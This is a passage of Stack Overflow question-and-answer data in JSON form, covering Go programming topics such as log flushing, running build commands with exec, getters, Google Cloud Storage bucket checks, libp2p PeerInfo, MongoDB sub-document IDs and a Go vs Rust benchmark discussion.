if err2 := syncer.Sync(); err2 != nil &amp;&amp; err == nil {\n            err = err2\n        }\n    }\n    return\n}\n</code></pre>\n\n<p>This implementation checks for both the <code>Flush()</code> method and <a href=\"https://golang.org/pkg/os/#File\" rel=\"nofollow noreferrer\"><code>os.File</code></a>'s <a href=\"https://golang.org/pkg/os/#File.Sync\" rel=\"nofollow noreferrer\"><code>Sync()</code></a> method, and calls if they are \"present\".</p>\n\n<p>This is how this can be used so that logging statements always flush:</p>\n\n<pre><code>f, err := os.Create(\"log.txt\")\nif err != nil {\n    panic(err)\n}\ndefer f.Close()\n\nlog.SetOutput(&amp;myWriter{Writer: f})\n\nlog.Println(\"hi\")\n</code></pre>\n\n<p>See related questions:</p>\n\n<p><a href=\"https://stackoverflow.com/questions/40396499/go-create-io-writer-inteface-for-logging-to-mongodb-database/40397008#40397008\">Go: Create io.Writer inteface for logging to mongodb database</a></p>\n\n<p><a href=\"https://stackoverflow.com/questions/52294334/net-http-set-custom-logger/52298092#52298092\">net/http set custom logger</a></p>\n"}], "owner": {"reputation": 5392, "user_id": 361836, "user_type": "registered", "accept_rate": 47, "profile_image": "https://www.gravatar.com/avatar/f426a26f03d7d4d61d354a3b2fc5337d?s=128&d=identicon&r=PG", "display_name": "lucidquiet", "link": "https://stackoverflow.com/users/361836/lucidquiet"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2595, "favorite_count": 0, "accepted_answer_id": 52964506, "answer_count": 2, "score": 1, "last_activity_date": 1540400057, "creation_date": 1540233870, "question_id": 52935858, "link": "https://stackoverflow.com/questions/52935858/how-and-when-is-the-go-sdk-logger-flushed", "title": "How and when is the Go sdk logger flushed?", "body": "<p>I'm trying to determine if the default/sdk logger log.PrintYYY() functions are flushed at some point in time, on exit, on panic, etc.  I'm unsure if I need to find a way to flush the writer that the logger is hooked up to, especially when setting the output writer with SetOutput(...).  Of course, the writer interface doesn't have a flush() method, so not really sure how that might get done.</p>\n\n<p>How and when is the Go sdk logger flushed?</p>\n"}, {"tags": ["go"], "comments": [{"owner": {"reputation": 32095, "user_id": 7426, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5a562698800b535e47b68590f63c402a?s=128&d=identicon&r=PG", "display_name": "Adrian", "link": "https://stackoverflow.com/users/7426/adrian"}, "edited": false, "score": 2, "creation_date": 1540229610, "post_id": 52934720, "comment_id": 92778749, "body": "You&#39;re not doing this in parallel, so... when <code>Invoke</code> finishes, all the commands have finished. What about this are you having trouble with? What have you tried?"}, {"owner": {"reputation": 28754, "user_id": 1153938, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/deBjQ.jpg?s=128&g=1", "display_name": "Vorsprung", "link": "https://stackoverflow.com/users/1153938/vorsprung"}, "edited": false, "score": 0, "creation_date": 1540242062, "post_id": 52934720, "comment_id": 92784554, "body": "func declaration for Invoke says it returns error but your return statements don&#39;t"}], "owner": {"user_type": "does_not_exist", "display_name": "user6171746"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 62, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1540229384, "creation_date": 1540229384, "question_id": 52934720, "link": "https://stackoverflow.com/questions/52934720/run-process-and-notify-when-finish", "title": "Run process and notify when finish", "body": "<p>Im using the following code which <strong>works fine</strong>,\nNow I want to <strong>notify</strong> to when the process finish </p>\n\n<p>I try to add another function after the <code>wait</code> and it doesn't helps</p>\n\n<p>I need to know when <strong>all the commands are finished successfully</strong> and send message to other package, how can I do it ? \nor call to <strong>other function</strong> just when the <code>Invoke</code> function <strong>done all the execution</strong></p>\n\n<pre><code> cmdParams := [][]string{\n        {filepath.Join(dir, path), \"npm\", \"install\"},\n        {filepath.Join(pdir, n.path), \"gulp\"},\n    }\n\nfunc Invoke(cmdParams [][]string) error {\n    for _, cp := range cmdParams {\n        log.Printf(\"Starting %s in folder %s...\", cp[1:], cp[0])\n        cmd := exec.Command(cp[1], cp[2:]...)\n        cmd.Dir = cp[0]\n\n        stdout, err := cmd.StdoutPipe()\n        if err != nil {\n            log.Printf(\"%s cmd.StdoutPipe() error: %v\\n\", cp[1:], err)\n            return\n        }\n        // Start command:\n        if err = cmd.Start(); err != nil {\n            log.Printf(\"%s start error: %v\\n\", cp[1:], err)\n            return\n        }\n\n        // Stream command output:\n        scanner := bufio.NewScanner(stdout)\n        scanner.Split(bufio.ScanRunes)\n        for scanner.Scan() {\n            fmt.Print(scanner.Text())\n        }\n        if scanner.Err() != nil {\n            log.Printf(\"Reading %s stdout error: %v\\n\", cp[1:], err)\n            return\n        }\n\n        // Get execution success or failure:\n        if err = cmd.Wait(); err != nil {\n            log.Printf(\"Error running %s: %v\\n\", cp[1:], err)\n            return\n        }\n        log.Printf(\"Finished %s\", cp[1:])\n    } \n</code></pre>\n"}, {"tags": ["go"], "comments": [{"owner": {"reputation": 42799, "user_id": 720999, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/04ee78e90161fa1c4dce14d615315160?s=128&d=identicon&r=PG", "display_name": "kostix", "link": "https://stackoverflow.com/users/720999/kostix"}, "edited": false, "score": 0, "creation_date": 1540230638, "post_id": 52934381, "comment_id": 92779224, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/52931254/setter-in-golang\">Setter in GoLang</a>"}], "answers": [{"tags": [], "owner": {"reputation": 32095, "user_id": 7426, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5a562698800b535e47b68590f63c402a?s=128&d=identicon&r=PG", "display_name": "Adrian", "link": "https://stackoverflow.com/users/7426/adrian"}, "is_accepted": true, "score": 3, "last_activity_date": 1540229473, "creation_date": 1540229473, "answer_id": 52934739, "question_id": 52934381, "link": "https://stackoverflow.com/questions/52934381/getter-in-golang/52934739#52934739", "title": "Getter in GoLang", "body": "<p>This (your code) takes the <code>pct</code> instance's <code>GetAge</code> method and stores it in a variable:</p>\n\n<pre><code>age:=pct.GetAge\n</code></pre>\n\n<p>This calls the <code>GetAge</code> method and stores its return value in a variable:</p>\n\n<pre><code>age:=pct.GetAge()\n</code></pre>\n\n<p>Consider taking the <a href=\"https://tour.golang.org/welcome/1\" rel=\"nofollow noreferrer\">Tour of Go</a> and reading the <a href=\"https://golang.org/ref/spec\" rel=\"nofollow noreferrer\">Go Specification</a> to get a basic understanding of Go syntax.</p>\n"}], "owner": {"reputation": 2754, "user_id": 849632, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/NDhZK.jpg?s=128&g=1", "display_name": "Arun", "link": "https://stackoverflow.com/users/849632/arun"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 428, "favorite_count": 0, "closed_date": 1540247519, "accepted_answer_id": 52934739, "answer_count": 1, "score": -2, "last_activity_date": 1540229473, "creation_date": 1540227886, "question_id": 52934381, "link": "https://stackoverflow.com/questions/52934381/getter-in-golang", "closed_reason": "Not suitable for this site", "title": "Getter in GoLang", "body": "<p>I have a custom type named <code>ProtectedCustomType</code> and I don't want the variables within that to be <code>set</code> or <code>get</code> directly by the caller, rather want a <code>Getter / Setter</code> methods to do that.</p>\n\n<p>Below is my <code>ProtectedCustomType</code></p>\n\n<pre><code>package custom\nimport \"fmt\"\n\ntype ProtectedCustomType struct {\n    name string\n    age string\n    phoneNumber int\n}\n\n\n\nfunc (pct *ProtectedCustomType) SetAge (age string)   {\n    pct.age=age\n    fmt.Println(pct.age)\n} \n\nfunc (pct *ProtectedCustomType) GetAge ()  string  {\n    return pct.age\n} \n</code></pre>\n\n<p>And here is my main function</p>\n\n<pre><code>package main\n\nimport (\n    \"fmt\"\n    \"./custom\"\n)\n\nvar print =fmt.Println\nfunc structCheck2() {\n    pct := custom.ProtectedCustomType{}\n    pct.SetAge(\"23\")\n    age:=pct.GetAge\n    print (age)\n}\n\nfunc main() {\n    structCheck2()\n}\n</code></pre>\n\n<p>I am expecting it to print <code>23</code>, but it is printing as <code>0x48b950</code> </p>\n"}, {"tags": ["go", "google-cloud-platform", "google-cloud-storage"], "answers": [{"comments": [{"owner": {"reputation": 608, "user_id": 4823789, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/16701fdace0347de7dbf1c356d295e76?s=128&d=identicon&r=PG&f=1", "display_name": "ND003", "link": "https://stackoverflow.com/users/4823789/nd003"}, "edited": false, "score": 0, "creation_date": 1540227524, "post_id": 52934258, "comment_id": 92777741, "body": "That looks more like a brute force approach. Is there no API which would take a bucket name and return if it exists?"}, {"owner": {"reputation": 14998, "user_id": 212378, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/185aae2d842026d2eefa7528b00b394b?s=128&d=identicon&r=PG", "display_name": "Alexis Wilke", "link": "https://stackoverflow.com/users/212378/alexis-wilke"}, "edited": false, "score": 0, "creation_date": 1577759593, "post_id": 52934258, "comment_id": 105247800, "body": "Yeah, if you have hundreds of buckets... that&#39;s probably not a good idea."}], "tags": [], "owner": {"reputation": 16516, "user_id": 1133291, "user_type": "registered", "accept_rate": 58, "profile_image": "https://www.gravatar.com/avatar/538bd3553b7540f411a84101e4cbf294?s=128&d=identicon&r=PG", "display_name": "Gal Ben-Haim", "link": "https://stackoverflow.com/users/1133291/gal-ben-haim"}, "is_accepted": false, "score": 0, "last_activity_date": 1540227406, "creation_date": 1540227406, "answer_id": 52934258, "question_id": 52933955, "link": "https://stackoverflow.com/questions/52933955/google-storage-how-to-check-if-a-bucket-exists/52934258#52934258", "title": "Google Storage : how to check if a bucket exists", "body": "<p>you can <code>func (c *Client) Buckets(ctx context.Context, projectID string) *BucketIterator</code> to iterate over the existing buckets and check if it exists.</p>\n"}, {"tags": [], "owner": {"reputation": 2435, "user_id": 5880234, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/gZPQi.jpg?s=128&g=1", "display_name": "F10", "link": "https://stackoverflow.com/users/5880234/f10"}, "is_accepted": true, "score": 5, "last_activity_date": 1540233742, "creation_date": 1540233742, "answer_id": 52935830, "question_id": 52933955, "link": "https://stackoverflow.com/questions/52933955/google-storage-how-to-check-if-a-bucket-exists/52935830#52935830", "title": "Google Storage : how to check if a bucket exists", "body": "<p>This can be done by using the <a href=\"https://godoc.org/cloud.google.com/go/storage#BucketHandle.Attrs\" rel=\"noreferrer\">Attrs function</a> :</p>\n\n<pre><code>bucket := client.Bucket(bucketName)\nexists,err := bucket.Attrs(ctx)\nif err != nil {\n    log.Fatalf(\"Message: %v\",err)\n}\nfmt.Println(exists)\n</code></pre>\n\n<p>Since <code>err</code>, prints <code>Message: storage: bucket doesn't exist</code>.</p>\n\n<p>In case you consider that having a function that directly mentions if a bucket exists or not would be useful, I suggest filling a <a href=\"https://issuetracker.google.com/issues/new?component=187243&amp;template=1162894\" rel=\"noreferrer\">feature request</a> to the Cloud Storage engineering team to consider having it on further releases.</p>\n"}], "owner": {"reputation": 608, "user_id": 4823789, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/16701fdace0347de7dbf1c356d295e76?s=128&d=identicon&r=PG&f=1", "display_name": "ND003", "link": "https://stackoverflow.com/users/4823789/nd003"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 4123, "favorite_count": 0, "accepted_answer_id": 52935830, "answer_count": 2, "score": 6, "last_activity_date": 1540301192, "creation_date": 1540226143, "last_edit_date": 1540301192, "question_id": 52933955, "link": "https://stackoverflow.com/questions/52933955/google-storage-how-to-check-if-a-bucket-exists", "title": "Google Storage : how to check if a bucket exists", "body": "<p>Using GoLang SDK for google cloud storage.... Cannot find a method to check if a bucket exists.</p>\n\n<pre><code>func (c *Client) Bucket(name string) *BucketHandle\n</code></pre>\n\n<p>Bucket returns a BucketHandle even if bucket does not exist.</p>\n\n<p>So, how can I check if the bucket exists? I do not want to create the bucket if it does not exist, so cannot take the route of trying to create a bucket and handle errors</p>\n"}, {"tags": ["go", "libp2p", "go-libp2p"], "answers": [{"comments": [{"owner": {"reputation": 15832, "user_id": 1156707, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/99055b620fb3a9d30a8f6ac480c25227?s=128&d=identicon&r=PG", "display_name": "Louis Thibault", "link": "https://stackoverflow.com/users/1156707/louis-thibault"}, "edited": false, "score": 1, "creation_date": 1540396098, "post_id": 52969934, "comment_id": 92852674, "body": "&quot;I&#39;ll work on it ;-)&quot;  &lt;=  this is why I like libp2p :)"}, {"owner": {"reputation": 15832, "user_id": 1156707, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/99055b620fb3a9d30a8f6ac480c25227?s=128&d=identicon&r=PG", "display_name": "Louis Thibault", "link": "https://stackoverflow.com/users/1156707/louis-thibault"}, "edited": false, "score": 0, "creation_date": 1540420632, "post_id": 52969934, "comment_id": 92864085, "body": "damn you&#39;re fast! Can&#39;t wait to contribute to this project :)"}], "tags": [], "owner": {"reputation": 2669, "user_id": 1970990, "user_type": "registered", "accept_rate": 43, "profile_image": "https://i.stack.imgur.com/2ociD.jpg?s=128&g=1", "display_name": "raulk", "link": "https://stackoverflow.com/users/1970990/raulk"}, "is_accepted": true, "score": 3, "last_activity_date": 1540386720, "creation_date": 1540386720, "answer_id": 52969934, "question_id": 52933917, "link": "https://stackoverflow.com/questions/52933917/how-can-i-get-a-peerinfo-from-a-host/52969934#52969934", "title": "How can I get a PeerInfo from a Host?", "body": "<p><a href=\"https://github.com/libp2p/go-libp2p-peerstore/blob/e200f3a5c18ecb223bbc1d0ad9316641fa0dbb94/peerinfo.go#L16\" rel=\"nofollow noreferrer\">PeerInfo</a> is a struct that encapsulates a peer ID and its multiaddrs. To build a PeerInfo from a Host easily, you can simply do the following:</p>\n\n<pre><code>pi := PeerInfo{\n        ID: host.ID(),\n        Addrs: host.Addrs(),\n}\n</code></pre>\n\n<p><code>pstore.InfoFromP2pAddr()</code> requires a multiaddr with a <code>p2p</code> or <code>ipfs</code> component in order to populate the <code>PeerInfo.ID</code> element.</p>\n\n<p>That said, we could definitely make it easier to obtain a <code>PeerInfo</code> from a <code>Host</code>. I'll work on it ;-)</p>\n"}], "owner": {"reputation": 15832, "user_id": 1156707, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/99055b620fb3a9d30a8f6ac480c25227?s=128&d=identicon&r=PG", "display_name": "Louis Thibault", "link": "https://stackoverflow.com/users/1156707/louis-thibault"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 177, "favorite_count": 0, "accepted_answer_id": 52969934, "answer_count": 1, "score": 0, "last_activity_date": 1540386720, "creation_date": 1540225976, "question_id": 52933917, "link": "https://stackoverflow.com/questions/52933917/how-can-i-get-a-peerinfo-from-a-host", "title": "How can I get a PeerInfo from a Host?", "body": "<p>I'm trying to get a <code>PeerInfo</code> from a <code>libp2p.Host</code> instance.  I'm able to get a list of <code>multiaddr.Multiaddr</code>s by calling <code>Host.Addrs()</code>, but I'm unable to convert these into a valid <code>peerstore.PeerInfo</code>.</p>\n\n<p>Here is my attempt, which panics with the error <code>panic: invalid p2p multiaddr</code>.</p>\n\n<pre><code>package main\n\nimport (\n    \"log\"\n\n    \"github.com/SentimensRG/ctx\"\n    \"github.com/SentimensRG/ctx/sigctx\"\n\n    libp2p \"github.com/libp2p/go-libp2p\"\n    ps \"github.com/libp2p/go-libp2p-peerstore\"\n)\n\nvar c = ctx.AsContext(sigctx.New())\n\nfunc main() {\n    h0, err := libp2p.New(c)\n    if err != nil {\n        panic(err)\n    }    \n\n    addr0 := h0.Addrs()[1]\n\n    _, err := ps.InfoFromP2pAddr(addr0)\n    if err != nil {\n        panic(err)\n    }\n}\n</code></pre>\n\n<h3>How can I get a <code>peerstore.PeerInfo</code> from a <code>libp2p.Host</code>?</h3>\n"}, {"tags": ["mongodb", "go", "mgo", "mux"], "comments": [{"owner": {"reputation": 32095, "user_id": 7426, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5a562698800b535e47b68590f63c402a?s=128&d=identicon&r=PG", "display_name": "Adrian", "link": "https://stackoverflow.com/users/7426/adrian"}, "edited": false, "score": 0, "creation_date": 1540226204, "post_id": 52933910, "comment_id": 92777089, "body": "I don&#39;t think you can. Documents have IDs, objects that are contained in documents are the responsibility of the application."}], "answers": [{"tags": [], "owner": {"reputation": 9279, "user_id": 6440033, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f070f5eb58ce80fa0b975a805e712362?s=128&d=identicon&r=PG&f=1", "display_name": "dnickless", "link": "https://stackoverflow.com/users/6440033/dnickless"}, "is_accepted": true, "score": 1, "last_activity_date": 1540233212, "creation_date": 1540233212, "answer_id": 52935683, "question_id": 52933910, "link": "https://stackoverflow.com/questions/52933910/append-new-sub-document-to-an-array-in-the-main-struct/52935683#52935683", "title": "Append new sub document to an array in the main struct", "body": "<p>MongoDB won't ever generate an <code>ID</code> for a sub-document on the server-side.</p>\n\n<p>Do you really need the <code>ID</code> on the sensor? MongoDB won't complain about a sub-document not having an <code>ID</code> (or its <code>ID</code> being in a wrong format) because a subdocument can have an arbitrary structure - so it can easily exist without an <code>ID</code>.</p>\n\n<p>If you do need the ID for some reason then you can, of course, create one on the client side:</p>\n\n<pre><code>sensor.ID := bson.NewObjectId()\n</code></pre>\n"}], "owner": {"reputation": 399, "user_id": 8555793, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/4243175498f555ba9f34a34bbe561c00?s=128&d=identicon&r=PG&f=1", "display_name": "JesterWest", "link": "https://stackoverflow.com/users/8555793/jesterwest"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 99, "favorite_count": 0, "accepted_answer_id": 52935683, "answer_count": 1, "score": 0, "last_activity_date": 1540233212, "creation_date": 1540225958, "question_id": 52933910, "link": "https://stackoverflow.com/questions/52933910/append-new-sub-document-to-an-array-in-the-main-struct", "title": "Append new sub document to an array in the main struct", "body": "<p>I have the following go structs in my MongoDB database:</p>\n\n<pre><code>type Station struct {\n    ID          bson.ObjectId `bson:\"_id\" json:\"id\"`\n    Name        string        `bson:\"name\" json:\"name\"`\n    Sensors     []Sensor `bson:\"sensors\" json:\"sensors\"`\n}\n\ntype Sensor struct {\n    ID             bson.ObjectId `bson:\"_id\" json:\"id\"`\n    Type string `  bson:\"type\" json:\"type\"`\n    Value float64 `bson:\"value\" json:\"value\"`\n}\n</code></pre>\n\n<p>When I make a POST request at the endpoint <code>localhost:3000/stations/&lt;IDofTheStation/sensors</code>, it should add a new sensor to the specified station.</p>\n\n<p>Currently I have this code</p>\n\n<pre><code>func AddSensorToStation(w http.ResponseWriter, r *http.Request) {\n    defer r.Body.Close()\n    params := mux.Vars(r)\n\n    station, err := dao.FindById(params[\"id\"])\n    if err != nil {\n        respondWithError(w, http.StatusBadRequest, \"Invalid Station ID\")\n        return\n    }\n\n    sensor := Sensor{Type: \"test\"}\n\n    station.Sensors = append(station.Sensors, sensor)   \n\n    if err := dao.Update(station); err != nil {\n        respondWithError(w, http.StatusInternalServerError, err.Error())\n        return\n    }\n\n    respondWithJson(w, http.StatusOK, station)\n}\n</code></pre>\n\n<p>The problem is that it does not automatically generate an ID for the new sensor that I want to add, thus it throws the error \"<em>ObjectIDs must be exactly 12 bytes long (got 0)</em>\"</p>\n\n<p><strong>What is the best way to append a new Sensor instance to the Sensors array where the DB generates the id for the sensor?</strong></p>\n"}, {"tags": ["performance", "go", "rust", "llvm-codegen"], "comments": [{"owner": {"reputation": 32095, "user_id": 7426, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5a562698800b535e47b68590f63c402a?s=128&d=identicon&r=PG", "display_name": "Adrian", "link": "https://stackoverflow.com/users/7426/adrian"}, "edited": false, "score": 6, "creation_date": 1540226122, "post_id": 52933875, "comment_id": 92777048, "body": "This kind of microbenchmark is unlikely to yield useful data."}, {"owner": {"reputation": 12516, "user_id": 302268, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/c3985dffcdc646b67ed0699a364639e2?s=128&d=identicon&r=PG", "display_name": "Mad Wombat", "link": "https://stackoverflow.com/users/302268/mad-wombat"}, "edited": false, "score": 3, "creation_date": 1540226217, "post_id": 52933875, "comment_id": 92777093, "body": "I have just compiled and ran both your benchmarks. I used <code>go build -o b1 bench.go</code> for the Go code and <code>rustc -O -o b2 bench.rs</code> for the Rust code. The go benchmark takes ~180ms the Rust benchmark takes ~3ms"}, {"owner": {"reputation": 12516, "user_id": 302268, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/c3985dffcdc646b67ed0699a364639e2?s=128&d=identicon&r=PG", "display_name": "Mad Wombat", "link": "https://stackoverflow.com/users/302268/mad-wombat"}, "edited": false, "score": 1, "creation_date": 1540226247, "post_id": 52933875, "comment_id": 92777110, "body": "At the same time, if I omit the -O flag for the rust compiler, the rust benchmark takes about 5 seconds to complete."}, {"owner": {"reputation": 12516, "user_id": 302268, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/c3985dffcdc646b67ed0699a364639e2?s=128&d=identicon&r=PG", "display_name": "Mad Wombat", "link": "https://stackoverflow.com/users/302268/mad-wombat"}, "edited": false, "score": 2, "creation_date": 1540226675, "post_id": 52933875, "comment_id": 92777331, "body": "Also, it seems like there is a huge difference between nightly and stable Rust compiler. Stable results in around 150ms results, still better than Go, but not by much. Nightly results in 2-4ms results, two orders of magnitude better than Go and stable Rust."}, {"owner": {"reputation": 12516, "user_id": 302268, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/c3985dffcdc646b67ed0699a364639e2?s=128&d=identicon&r=PG", "display_name": "Mad Wombat", "link": "https://stackoverflow.com/users/302268/mad-wombat"}, "edited": false, "score": 1, "creation_date": 1540226881, "post_id": 52933875, "comment_id": 92777437, "body": "It is entirely possible, that nightly Rust compiler figured out that the loop is deterministic just skipped the whole thing in favor of the end result :) But I am too lazy to dig around assembly to figure it out."}, {"owner": {"reputation": 269529, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": "https://stackoverflow.com/users/155423/shepmaster"}, "reply_to_user": {"reputation": 12516, "user_id": 302268, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/c3985dffcdc646b67ed0699a364639e2?s=128&d=identicon&r=PG", "display_name": "Mad Wombat", "link": "https://stackoverflow.com/users/302268/mad-wombat"}, "edited": false, "score": 4, "creation_date": 1540226881, "post_id": 52933875, "comment_id": 92777439, "body": "@MadWombat probably the optimizer learned some new tricks. Since <code>work</code> is never actually read from, none of the writes to it matter."}, {"owner": {"reputation": 12516, "user_id": 302268, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/c3985dffcdc646b67ed0699a364639e2?s=128&d=identicon&r=PG", "display_name": "Mad Wombat", "link": "https://stackoverflow.com/users/302268/mad-wombat"}, "edited": false, "score": 0, "creation_date": 1540226930, "post_id": 52933875, "comment_id": 92777462, "body": "I wonder if printing work at the end would change things"}, {"owner": {"reputation": 12516, "user_id": 302268, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/c3985dffcdc646b67ed0699a364639e2?s=128&d=identicon&r=PG", "display_name": "Mad Wombat", "link": "https://stackoverflow.com/users/302268/mad-wombat"}, "edited": false, "score": 0, "creation_date": 1540227075, "post_id": 52933875, "comment_id": 92777540, "body": "Well, predictably, after I added a print statement for work var to both benchmarks, the results became more comparable. Rust still wins. Rust takes about 150ms and Go is 180-190ms."}, {"owner": {"reputation": 11, "user_id": 10541337, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8d810ea7b8fecfdb2ab3a9871a95315e?s=128&d=identicon&r=PG&f=1", "display_name": "Kyle", "link": "https://stackoverflow.com/users/10541337/kyle"}, "reply_to_user": {"reputation": 12516, "user_id": 302268, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/c3985dffcdc646b67ed0699a364639e2?s=128&d=identicon&r=PG", "display_name": "Mad Wombat", "link": "https://stackoverflow.com/users/302268/mad-wombat"}, "edited": false, "score": 0, "creation_date": 1540228107, "post_id": 52933875, "comment_id": 92778036, "body": "@MadWombat Interestingly, when I compiled with <code>rustc -O -o</code> I saw negligible difference between the two languages at ~170ms. It appears <code>--release</code> != fully optimised"}, {"owner": {"reputation": 12516, "user_id": 302268, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/c3985dffcdc646b67ed0699a364639e2?s=128&d=identicon&r=PG", "display_name": "Mad Wombat", "link": "https://stackoverflow.com/users/302268/mad-wombat"}, "edited": false, "score": 0, "creation_date": 1540228487, "post_id": 52933875, "comment_id": 92778232, "body": "So basically, all these experiments seem to tell us that the benchmarks are not very conclusive."}, {"owner": {"reputation": 269529, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": "https://stackoverflow.com/users/155423/shepmaster"}, "edited": false, "score": 1, "creation_date": 1540234448, "post_id": 52933875, "comment_id": 92781005, "body": "<code>i := 0; i &lt; 100000000; i++</code> and <code>1..100000000</code> are not the same range."}], "answers": [{"comments": [{"owner": {"reputation": 11, "user_id": 10541337, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8d810ea7b8fecfdb2ab3a9871a95315e?s=128&d=identicon&r=PG&f=1", "display_name": "Kyle", "link": "https://stackoverflow.com/users/10541337/kyle"}, "edited": false, "score": 0, "creation_date": 1540229129, "post_id": 52934180, "comment_id": 92778526, "body": "Appreciate the very clear and helpful answer. The original problem was implementing a bubble sort in both languages (purely for the educational value). The memory swap is where Go pulled ahead, so thats all I included in this question, perhaps at the detriment of context/clarity. With 100,000 elements, the difference in execution time was into the seconds."}, {"owner": {"reputation": 6137, "user_id": 847382, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/b73e2fff665c33621c8a4347cf8074be?s=128&d=identicon&r=PG", "display_name": "PitaJ", "link": "https://stackoverflow.com/users/847382/pitaj"}, "reply_to_user": {"reputation": 11, "user_id": 10541337, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8d810ea7b8fecfdb2ab3a9871a95315e?s=128&d=identicon&r=PG&f=1", "display_name": "Kyle", "link": "https://stackoverflow.com/users/10541337/kyle"}, "edited": false, "score": 3, "creation_date": 1540229368, "post_id": 52934180, "comment_id": 92778645, "body": "@Kyle if you have a more complete example of a bubble sort that&#39;s slower than expected, you should open another question"}, {"owner": {"reputation": 478015, "user_id": 279627, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/2dceea858ad8f1577bec6ddaa0485d15?s=128&d=identicon&r=PG", "display_name": "Sven Marnach", "link": "https://stackoverflow.com/users/279627/sven-marnach"}, "edited": false, "score": 0, "creation_date": 1540235722, "post_id": 52934180, "comment_id": 92781586, "body": "The most puzzling thing about the generated code is <code>add eax, -11</code>.  It&#39;s completely beyond me where <i>that</i> is coming from.  If it was some even number, I would assume that the optimizer had unrolled that number of iterations and figured out that an even number of swaps is a no-op. But with 11, I don&#39;t really have an idea."}, {"owner": {"reputation": 53967, "user_id": 2408867, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/994y9.jpg?s=128&g=1", "display_name": "Lukas Kalbertodt", "link": "https://stackoverflow.com/users/2408867/lukas-kalbertodt"}, "reply_to_user": {"reputation": 478015, "user_id": 279627, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/2dceea858ad8f1577bec6ddaa0485d15?s=128&d=identicon&r=PG", "display_name": "Sven Marnach", "link": "https://stackoverflow.com/users/279627/sven-marnach"}, "edited": false, "score": 0, "creation_date": 1540236727, "post_id": 52934180, "comment_id": 92782084, "body": "@SvenMarnach That confused me too! I guess you are pretty close already with partial loop unrolling and LLVM optimizing 11 iterations into one swap. But why start at 11 and not notice that like... 8 iterations compile down to nothing? Maybe we should ask a question on this StackOverflow everyone is talking about? ^_^"}, {"owner": {"reputation": 534, "user_id": 3882704, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3e5f3c0ad59d68324bd15384465a8f17?s=128&d=identicon&r=PG", "display_name": "Kellen", "link": "https://stackoverflow.com/users/3882704/kellen"}, "edited": false, "score": 0, "creation_date": 1540388745, "post_id": 52934180, "comment_id": 92847478, "body": "Another possibility in this example, when you know that your Vec doesn&#39;t need to grow, is to use a fixed-size array. On 1m iterations, using criterion on my ancient machine: original at 5.0338ms, with macro 4.5929ms, using an array 3.0950ns"}], "tags": [], "owner": {"reputation": 53967, "user_id": 2408867, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/994y9.jpg?s=128&g=1", "display_name": "Lukas Kalbertodt", "link": "https://stackoverflow.com/users/2408867/lukas-kalbertodt"}, "is_accepted": true, "score": 9, "last_activity_date": 1540227099, "creation_date": 1540227099, "answer_id": 52934180, "question_id": 52933875, "link": "https://stackoverflow.com/questions/52933875/why-is-swapping-elements-of-a-float64-in-go-faster-than-swapping-elements-of-a/52934180#52934180", "title": "Why is swapping elements of a []float64 in Go faster than swapping elements of a Vec&lt;f64&gt; in Rust?", "body": "<blockquote>\n  <p>Could the Rust program be written in an idiomatic way, to execute faster?</p>\n</blockquote>\n\n<p>Yes. To create a vector with a few elements, use the 